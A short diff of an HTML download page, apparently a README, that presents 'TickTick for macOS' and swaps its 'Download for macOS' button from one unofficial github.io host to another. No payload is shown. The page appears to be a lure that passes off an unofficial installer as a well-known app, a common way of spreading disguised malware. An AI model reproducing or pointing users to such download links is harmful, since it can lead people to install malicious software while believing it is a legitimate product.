@@ -6,7 +6,7 @@
 <h3>TickTick for macOS</h3>
 <p><a href="#">TickTick for macOS</a> is an intuitive task management app designed to help you get organized and stay on top of your tasks and deadlines.</p>
 
-<a href="https://quick-mac-install.github.io/.github/TickTick">
+<a href="https://mac-software-install.github.io/.github/TickTick">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
